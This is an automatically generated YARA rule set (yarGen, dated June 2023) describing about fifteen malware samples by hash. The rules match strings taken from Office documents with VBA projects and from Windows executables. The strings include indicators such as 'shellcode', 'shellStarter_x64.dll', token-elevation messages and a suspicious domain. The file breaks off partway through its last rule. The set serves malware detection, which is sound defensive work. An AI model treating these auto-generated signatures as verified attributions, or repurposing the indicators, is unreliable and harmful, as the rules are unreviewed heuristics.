/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2023-06-30
   Identifier: mw
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95 {
   meta:
      description = "mw - file 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
   strings:
      $s1 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "z(Ro=Tm" fullword ascii
      $s12 = "jv`fW~^" fullword ascii
      $s13 = "wrM>q^1" fullword ascii
      $s14 = "SH[%Heq" fullword ascii
      $s15 = "SB#P}[" fullword ascii
      $s16 = "SV/=`dQ" fullword ascii
      $s17 = "8WMg<UuG" fullword ascii
      $s18 = "6(2\",<" fullword ascii
      $s19 = "~U.#HR`y{-> |" fullword ascii
      $s20 = "55$`M=r@vb" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 40KB and
      8 of them
}

rule e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d {
   meta:
      description = "mw - file e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "e1a0aabc4b0a1b7d381e90cc2ef8e996ceb85dcd9a13b4750d739f6979249c6d"
   strings:
      $s1 = "xl/vbaProject.bin" fullword ascii
      $s2 = "mSpy oI" fullword ascii
      $s3 = "xl/sharedStrings.xmlPK" fullword ascii
      $s4 = "xl/sharedStrings.xml4" fullword ascii
      $s5 = "xl/vbaProject.binPK" fullword ascii
      $s6 = "r:\"y_dl" fullword ascii
      $s7 = "PMX$+ " fullword ascii
      $s8 = "(4x @- )" fullword ascii
      $s9 = "temqxf" fullword ascii
      $s10 = "ODEgVBo" fullword ascii
      $s11 = "nOMR/Hy" fullword ascii
      $s12 = "brJw(@\\>" fullword ascii
      $s13 = "iAZd:ON" fullword ascii
      $s14 = ";f;[=ujem?" fullword ascii
      $s15 = "DDEks]o" fullword ascii
      $s16 = ":eVSWkk3" fullword ascii
      $s17 = "OnRiFx#" fullword ascii
      $s18 = "doRy{^M&Z~" fullword ascii
      $s19 = "nXufeOvS" fullword ascii
      $s20 = "BQLN>]ED" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      8 of them
}

rule sig_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502 {
   meta:
      description = "mw - file 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
   strings:
      $s1 = "word/_rels/header1.xml.rels" fullword ascii
      $s2 = "word/header1.xml" fullword ascii
      $s3 = "word/_rels/header1.xml.relsPK" fullword ascii
      $s4 = "kTT1teGAh" fullword ascii /* base64 encoded string 'M=mx`!' */
      $s5 = " & & &" fullword ascii /* reversed goodware string '& & & ' */
      $s6 = "word/vbaProject.bin" fullword ascii
      $s7 = "word/_rels/vbaProject.bin.relsPK" fullword ascii
      $s8 = "word/_rels/vbaProject.bin.relsm" fullword ascii
      $s9 = "word/header1.xmlPK" fullword ascii
      $s10 = "W- fqL -" fullword ascii
      $s11 = "docProps/core.xml" fullword ascii
      $s12 = "docProps/app.xml" fullword ascii
      $s13 = "word/media/image1.png" fullword ascii
      $s14 = "P^=T:\\" fullword ascii
      $s15 = "word/vbaData.xml" fullword ascii
      $s16 = "BT:\"13" fullword ascii
      $s17 = "word/media/image2.png" fullword ascii
      $s18 = "zV:\\r*" fullword ascii
      $s19 = "Be:\",h" fullword ascii
      $s20 = "7X:\\TVMZ" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule sig_4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530 {
   meta:
      description = "mw - file 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
   strings:
      $s1 = "customXml/itemProps1.xml" fullword ascii
      $s2 = "customXml/itemProps3.xml" fullword ascii
      $s3 = "customXml/itemProps2.xml" fullword ascii
      $s4 = "word/_rels/header1.xml.rels" fullword ascii
      $s5 = "word/header1.xml" fullword ascii
      $s6 = "word/header2.xml" fullword ascii
      $s7 = "word/_rels/header2.xml.rels" fullword ascii
      $s8 = "customXml/itemProps3.xmle" fullword ascii
      $s9 = "BDLL(pR" fullword ascii
      $s10 = "word/media/image3.png" fullword ascii
      $s11 = "customXml/_rels/item2.xml.rels" fullword ascii
      $s12 = "word/media/image6.svg" fullword ascii
      $s13 = "word/glossary/document.xml" fullword ascii
      $s14 = "word/glossary/fontTable.xml" fullword ascii
      $s15 = "word/media/image7.jpg" fullword ascii
      $s16 = "word/glossary/webSettings.xml" fullword ascii
      $s17 = "customXml/item1.xml" fullword ascii
      $s18 = "customXml/item3.xml" fullword ascii
      $s19 = "docProps/core.xml" fullword ascii
      $s20 = "customXml/_rels/item3.xml.rels" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      8 of them
}

rule sig_132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f {
   meta:
      description = "mw - file 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
   strings:
      $s1 = "FTreeBrowser.dll" fullword ascii
      $s2 = "FTreeBrowser.EXE" fullword wide
      $s3 = "wwwwpppp" fullword ascii /* reversed goodware string 'ppppwwww' */
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s5 = " Type Descriptor'" fullword ascii
      $s6 = " /p \"%1\"" fullword ascii
      $s7 = " constructor or from DllMain." fullword ascii
      $s8 = "pwwwwppwwwwwwwwwwttp" fullword ascii
      $s9 = "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww" fullword ascii
      $s10 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s11 = "FTreeBrowser Version 1.0" fullword wide
      $s12 = "FtreeB Files (*.ftb)" fullword wide
      $s13 = "FTreeBrowser.Document" fullword wide
      $s14 = " Class Hierarchy Descriptor'" fullword ascii
      $s15 = " Base Class Descriptor at (" fullword ascii
      $s16 = "DllRegisterServer1" fullword ascii
      $s17 = " Complete Object Locator'" fullword ascii
      $s18 = " /pt \"%1\" \"%2\" \"%3\" \"%4\"" fullword ascii
      $s19 = "Regserver" fullword ascii /* Goodware String - occured 111 times */
      $s20 = "command" fullword ascii /* Goodware String - occured 524 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9 {
   meta:
      description = "mw - file 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
   strings:
      $s1 = "Detrimon.dll" fullword ascii
      $s2 = "K:\\Detrimon\\x64\\Release\\Detrimon.pdb" fullword ascii
      $s3 = "Tab.exe" fullword wide
      $s4 = "http://www.digicert.com/CPS0" fullword ascii
      $s5 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii
      $s6 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s7 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s8 = "numMutex" fullword ascii
      $s9 = "http://ocsp.digicert.com0\\" fullword ascii
      $s10 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii
      $s11 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii
      $s12 = "http://www.digicert.com/CPS0" fullword ascii
      $s13 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii
      $s14 = "C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl" fullword ascii
      $s15 = " Type Descriptor'" fullword ascii
      $s16 = " constructor or from DllMain." fullword ascii
      $s17 = "G(---  ---(G" fullword ascii
      $s18 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s19 = "Tab Version 1.0" fullword wide
      $s20 = "OOOOOOJ" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505 {
   meta:
      description = "mw - file 19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "19f8797dc1c69909d8d0fb563d13e955dc98a1d22fdf8b2c551731323d672505"
   strings:
      $s1 = "        <requestedExecutionLevel" fullword ascii
      $s2 = "    processorArchitecture=\"x86\"" fullword ascii
      $s3 = "  <description>Device Display Object Function Discovery Provider</description>" fullword ascii
      $s4 = ">3>@>E>\\>" fullword ascii /* hex encoded string '>' */
      $s5 = "7 7$7(7,70747 :$:(:,:0:4:8:" fullword ascii /* hex encoded string 'wwptpH' */
      $s6 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s7 = "    version=\"1.0.0.0\"" fullword ascii
      $s8 = "  </trustInfo>" fullword ascii
      $s9 = ".?AVTProviderServices@@" fullword ascii /* Goodware String - occured 1 times */
      $s10 = ".?AVTDeviceFunctionCallback@@" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "|mjHXf;E" fullword ascii
      $s12 = ".?AVTFileStream@@" fullword ascii /* Goodware String - occured 1 times */
      $s13 = ".?AVTComputerDevice@@" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "0242@2D2" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "5G5R5c5" fullword ascii /* Goodware String - occured 1 times */
      $s16 = ".?AVTDDOProvider@@" fullword ascii /* Goodware String - occured 1 times */
      $s17 = ".?AVTSRWLock@@" fullword ascii /* Goodware String - occured 1 times */
      $s18 = ".?AVTClassFactory@@" fullword ascii /* Goodware String - occured 1 times */
      $s19 = ".?AVTDeviceFunction@@" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "DeviceDisplayObjectProvider.pdb" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62 {
   meta:
      description = "mw - file 2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "2ebcc948ef663d83710f246fe2c0e185a92fa29c12b94934ef189d43c4d18c62"
   strings:
      $s1 = "Source" fullword wide /* Goodware String - occured 499 times */
      $s2 = "0V1\\1c1j1q1{1" fullword ascii /* Goodware String - occured 1 times */
      $s3 = ":?;R;X;t;z;" fullword ascii /* Goodware String - occured 1 times */
      $s4 = ",Evids" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "3 3$3(3,3034383<3T3X3\\3`3d3h3l3p3t3x3|3" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "93:=:u:" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "|+;F@}&" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "0%1-151T1q1" fullword ascii /* Goodware String - occured 1 times */
      $s9 = ":H;7<\\<" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "1+2E2\\2}3" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "5%5<5C5T5Z5{5u6" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "3%363=3^3" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "<%<2<W<a<g<" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "RSDSJx" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "8!9>9a9" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "546K6y6" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "7\\8c80:6:<:W:" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "0[1*4j5" fullword ascii /* Goodware String - occured 1 times */
      $s19 = ": :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\\:h:x:|:" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "2*20262K2Q2^2{2f3w3" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d {
   meta:
      description = "mw - file 3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d"
   strings:
      $x1 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\wmi-0.9.1\\src\\connection.rswmi::connectionCallin" ascii
      $x2 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.18\\src\\lib.rs" fullword ascii
      $x3 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.18\\src\\legacy.rs" fullword ascii
      $x4 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hashbrown-0.9.0\\src\\raw\\mod.rs" fullword ascii
      $x5 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\wmi-0.9.1\\src\\connection.rswmi::connectionCallin" ascii
      $s6 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\num\\dec2flt\\mo" ascii
      $s7 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\alloc\\layout.rs" ascii
      $s8 = "attempt to divide by zeroC:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\num-integer-0.1.44\\src" ascii
      $s9 = "attempt to divide by zeroC:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\num-integer-0.1.44\\src" ascii
      $s10 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\impls.rsH)" fullword ascii
      $s11 = "\\\\.\\pipe\\__rust_anonymous_pipe1__.library\\std\\src\\sys\\windows\\rand.rscouldn't generate random bytes: library\\std\\src" ascii
      $s12 = "wbimebroker.exeqqpyusercenter.exetim.exetxplatform.exeeim.exeruntimebroker.exedwm.exe" fullword ascii
      $s13 = "C:\\Users\\root\\.cargo\\registry\\src\\mirrors.ustc.edu.cn-61ef6e0cd06fb9b8\\base64-0.13.0\\src\\decode.rs" fullword ascii
      $s14 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\str\\pattern.rs" fullword ascii
      $s15 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\alloc\\layout.rs" ascii
      $s16 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\char\\methods.rs" ascii
      $s17 = "a Display implementation returned an error unexpectedlyC:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib" ascii
      $s18 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rs" fullword ascii
      $s19 = "C:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections\\bt" ascii
      $s20 = "a Display implementation returned an error unexpectedlyC:\\Users\\root\\.rustup\\toolchains\\nightly-x86_64-pc-windows-msvc\\lib" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c {
   meta:
      description = "mw - file a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
   strings:
      $x1 = "LaunchProcessAsNotElevatedUser cmd: " fullword wide
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s3 = "Using linked token from not elevated process " fullword wide
      $s4 = "Using primary token from elevated process " fullword wide
      $s5 = "could not find GetVersionExW in Kernel32.dll" fullword wide
      $s6 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii
      $s7 = "http://www.adobe.com/support/downloads/product.jsp?product=10&platform=Windows" fullword ascii
      $s8 = "http://www.adobe.com/support/downloads/product.jsp?product=1&platform=Windows" fullword ascii
      $s9 = "Using primary token from elevated process or ordered by caller  " fullword wide
      $s10 = "DComdlg32.dll" fullword wide
      $s11 = "could not get module handle for Kernel32.dll" fullword wide
      $s12 = "GetTokenFromSpecificProcess: " fullword wide
      $s13 = "AdobeARM.exe" fullword ascii
      $s14 = "D:\\DCB\\CBT_Main\\BuildResults\\bin\\Win32\\Release\\AdobeARMHelper.pdb" fullword ascii
      $s15 = "AdobeARMHelper.exe" fullword ascii
      $s16 = "adobearm.exe" fullword wide
      $s17 = "no running adobearm.exe" fullword wide
      $s18 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii
      $s19 = "ShellExecute failed" fullword wide
      $s20 = "CreateProcessAsUser failed" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d {
   meta:
      description = "mw - file d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii
      $s2 = "DeleteGroupadd_OnExecuteCommandgetCommandIdentity" fullword ascii
      $s3 = "kitty-temp.exe" fullword wide
      $s4 = "SendExecuteDependencyCodeGetTypesFromInterface" fullword ascii
      $s5 = "get_InstanceExecuteGetWindowTextLength" fullword ascii
      $s6 = "shellcode" fullword ascii
      $s7 = "get_AliasesLogWarningProcessLog" fullword ascii
      $s8 = "ProcessLogLogGetGroup" fullword ascii
      $s9 = "Reloadget_PermissionsProcessLog" fullword ascii
      $s10 = "processLogget_AvatarIconGetPlugin" fullword ascii
      $s11 = "<FixedUpdate>b__4_0SaveGroupExecute" fullword ascii
      $s12 = "ParseUInt64ParseDoubleExecute" fullword ascii
      $s13 = "PROCESS_MODE_BACKGROUND_BEGIN" fullword ascii
      $s14 = "processAccess" fullword ascii
      $s15 = "DEBUG_PROCESS" fullword ascii
      $s16 = "PROCESS_MODE_BACKGROUND_END" fullword ascii
      $s17 = "DEBUG_ONLY_THIS_PROCESS" fullword ascii
      $s18 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s19 = "DETACHED_PROCESS" fullword ascii
      $s20 = "CREATE_PROTECTED_PROCESS" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b {
   meta:
      description = "mw - file 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
   strings:
      $s1 = "K:\\WindowsSDK7-Samples-master\\WindowsSDK7-Samples-master\\winbase\\DeviceFoundation\\PNPX\\SimpleThermostat\\Release\\x64\\UPn" ascii
      $s2 = "UPnPSimpleThermostatDevice.dll" fullword ascii
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s4 = "ermostatDeviceDLL.pdb" fullword ascii
      $s5 = "2GetDesiredTempWW" fullword ascii
      $s6 = "GetCurrentTempWW" fullword ascii
      $s7 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s8 = "K:\\WindowsSDK7-Samples-master\\WindowsSDK7-Samples-master\\winbase\\DeviceFoundation\\PNPX\\SimpleThermostat\\Release\\x64\\UPn" ascii
      $s9 = "AppPolicyGetThreadInitializationType" fullword ascii
      $s10 = "`template-parameter-" fullword ascii
      $s11 = "plTempWW" fullword ascii
      $s12 = "lTempWWWd" fullword ascii
      $s13 = "desiredTempW" fullword ascii
      $s14 = "plTempOutWWW" fullword ascii
      $s15 = "DEcurrentTempW" fullword ascii
      $s16 = "SetDesiredTempWW" fullword ascii
      $s17 = " Type Descriptor'" fullword ascii
      $s18 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii
      $s19 = "operator co_await" fullword ascii
      $s20 = "operator<=>" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f {
   meta:
      description = "mw - file 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s2 = "shellStarter_x64.dll" fullword ascii
      $s3 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii
      $s4 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s5 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii
      $s6 = " Type Descriptor'" fullword ascii
      $s7 = "operator co_await" fullword ascii
      $s8 = "operator<=>" fullword ascii
      $s9 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s10 = " Class Hierarchy Descriptor'" fullword ascii
      $s11 = " Base Class Descriptor at (" fullword ascii
      $s12 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii
      $s13 = "vileges></security></trustInfo><application xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http:/" ascii
      $s14 = " Complete Object Locator'" fullword ascii
      $s15 = "SECURITY" fullword ascii /* Goodware String - occured 291 times */
      $s16 = "Hardware" fullword ascii /* Goodware String - occured 321 times */
      $s17 = "HKEY_PERFORMANCE_DATA" fullword ascii /* Goodware String - occured 335 times */
      $s18 = "FileType" fullword ascii /* Goodware String - occured 346 times */
      $s19 = "HKEY_DYN_DATA" fullword ascii /* Goodware String - occured 350 times */
      $s20 = "HKEY_CURRENT_CONFIG" fullword ascii /* Goodware String - occured 358 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174 {
   meta:
      description = "mw - file b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
   strings:
      $s1 = "AVGDll.dll" fullword ascii
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s3 = " Type Descriptor'" fullword ascii
      $s4 = "read failed:%d" fullword ascii
      $s5 = "operator co_await" fullword ascii
      $s6 = "read file success" fullword ascii
      $s7 = "Qc.cfg" fullword wide
      $s8 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s9 = " Class Hierarchy Descriptor'" fullword ascii
      $s10 = " Base Class Descriptor at (" fullword ascii
      $s11 = "open file success" fullword ascii
      $s12 = " Complete Object Locator'" fullword ascii
      $s13 = " delete[]" fullword ascii
      $s14 = "__swift_2" fullword ascii
      $s15 = "__swift_1" fullword ascii
      $s16 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
      $s17 = "QQSVj8j@" fullword ascii
      $s18 = "create file fialed:%d" fullword ascii
      $s19 = "0O1S1W1[1_1c1g1k1" fullword ascii /* Goodware String - occured 1 times */
      $s20 = "l0Nt4GG2EGLcklsHmh" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule bb4fe58a0d6cbb1237d46f2952d762cc {
   meta:
      description = "mw - file bb4fe58a0d6cbb1237d46f2952d762cc"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-06-30"
      hash1 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s3 = "/login/member/center/logins" fullword wide
      $s4 = " Type Descriptor'" fullword ascii
      $s5 = "operator co_await" fullword ascii
      $s6 = "operator<=>" fullword ascii
      $s7 = "UBContent" fullword wide
      $s8 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s9 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s10 = "Error %u in WinHttpSendRequest_." fullword ascii
      $s11 = "pro.pro-pay.xyz" fullword wide
      $s12 = " Class Hierarchy Descriptor'" fullword ascii
      $s13 = " Base Class Descriptor at (" fullword ascii
      $s14 = " Complete Object Locator'" fullword ascii
      $s15 = " delete[]" fullword ascii
      $s16 = "  </trustInfo>" fullword ascii
      $s17 = "k4+kP+" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "__swift_2" fullword ascii
      $s19 = "__swift_1" fullword ascii
      $s20 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0 {
   meta:
